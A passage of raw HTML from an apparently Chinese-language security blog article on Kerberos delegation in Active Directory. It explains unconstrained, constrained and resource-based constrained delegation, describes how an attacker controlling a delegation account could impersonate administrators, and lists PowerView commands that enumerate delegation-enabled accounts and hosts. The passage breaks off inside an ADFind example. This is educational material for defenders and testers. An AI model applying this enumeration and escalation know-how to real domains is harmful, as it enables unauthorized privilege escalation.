src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/35_OYvqIrEQHCic9tjjLMzcZAR1CsIDIQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIcyyQlERYyACDW4UKovP3DcjC9OYvqIrEQHCic9tjjLMzcZAR1CsIDIQ/640?wx_fmt=png'" data-type="png" data-w="1047" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><span style=" color: rgb(0, 0, 0); text-align: start; ">配置了约束委派的账户的 userAccountControl 属性有个FLAG位 TRUSTED_TO_AUTH_FOR_DELEGATION，并且msDS-AllowedToDelegateTo 属性还会指定对哪个SPN进行委派。</span><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><span style=" color: rgb(0, 0, 0); text-align: start; "></span></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="1.0355329949238579" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/36_u2CvgiaYl0vAoYvm1vOPwxwCxj4XeA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIkwiaoDnExgvWTD6icFYu5vxOFWAu2CvgiaYl0vAoYvm1vOPwxwCxj4XeA/640?wx_fmt=png'" data-type="png" data-w="394" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7668067226890757" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/37_SoicxSTnEgW0HZCIY6NeY2miaD3M5Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIHHSAhvtwfIjQ9vBZTV50bLEpxBSoicxSTnEgW0HZCIY6NeY2miaD3M5Q/640?wx_fmt=png'" data-type="png" data-w="952" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);"><strong style="-webkit-tap-highlight-color: transparent;text-align: left;color: rgb(15, 76, 129);line-height: 1.75;font-size:14px;line-height:34px;;">基于资源的约束性委派</strong></h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;"></strong></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">为了使用户/资源更加独立，微软在Windows Server 2012中引入了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设置，而把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派只能在运行Windows Server 2012和Windows Server 2012 R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束委派的账户的 userAccountControl 属性为 WORKSTATION_TRUST_ACCOUNT，并且msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为被允许基于资源约束性委派的账号的SID。&nbsp;<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.41228070175438597" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/38_FoPAOibkB3xl3VdnPibkTvdhRyl1Kg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaICVX1ib1ar4rbcqfFfQzriajeH6lXFoPAOibkB3xl3VdnPibkTvdhRyl1Kg/640?wx_fmt=png'" data-type="png" data-w="798" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">基于资源的约束性委派和约束性委派差别</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />委派的权限授予给了拥有资源的后端(B)，而不再是前端(A)<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑”msDS-AllowedToActOnBehalfOfOtherIdentity”属性的权限，也就是 将计算机加入域的域用户 和 机器自身 拥有权限。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />传统的约束委派是“正向的”，通过修改服务A的属性”msDS-AllowedToDelegateTo”，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />而基于资源的约束委派则是相反的，通过修改服务B属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">非约束委派和约束委派的流程</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">1.非约束委派流程</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">前提：</strong>在机器账号B上配置了非约束性委派(域管理员才有权限配置)<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />1.用户访问机器B的某个服务，于是向KDC认证。KDC会检查机器B的机器账号的属性，发现是非约束性委派，KDC会将用户的TGT放在ST服务票据中。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />2.用户访问机器B时，TGT票据会和ST服务票据一同发送给机器B<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />3.这样B在验证ST服务票据的同时获取了用户的TGT，并将TGT存储在LSASS进程中，从而可以模拟用户访问任意服务<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />从网络攻击的角度来看，如果攻击者控制了机器B的机器账号，并且机器B配置了非约束性委派。则攻击者可以诱骗管理员来访问机器B，然后攻击者可以获取管理员的TGT，从而模拟管理员访问任意服务，即获得了管理员权限。<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.约束性委派流程</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">前提：</strong>在服务A上配置到服务B约束性委派(域管理员才有权限配置)<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />1.用户访问服务A，于是向域控进行kerberos认证，域控返回ST1服务票据给用户，用户使用此服务票据访问服务A<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />2.若该服务A允许委派给服务B，则A能使用S4U2Proxy协议将用户发送给自己的可转发的ST1服务票据以用户的身份再转发给域控制器。于是域控返回给服务A一个ST2服务票据，<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />3.服务A便能使用获得的ST2服务票据以用户的身份访问服务B。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />从网络攻击的角度来看，如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。则攻击者可以利用服务A以administrator身份访问域控的CIFS服务，即相当于控制了域控。<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">筛选非委派属性的账号</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />注：域控主机账户默认开启非约束委派</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">1.PowerSploit下的PowerView.ps1脚本</h3><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\PowerView</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">查询域中配置非约束委派的账户</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">NetUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Unconstrained</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">NetUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Unconstrained</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">select</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> name</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">查询域中配置非约束委派的主机：</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">NetComputer</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Unconstrained</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">select</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> name</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3543913713405239" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/39_vyIT5PjLtBbNFooKPSbOeOEYibxeEg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI1DIyMdv9H8NKXHYNRNV5fzVCdvyIT5PjLtBbNFooKPSbOeOEYibxeEg/640?wx_fmt=png'" data-type="png" data-w="1298" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.ADFind</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />使用参数</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">AdFind</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">switches</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b basedn</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f filter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span 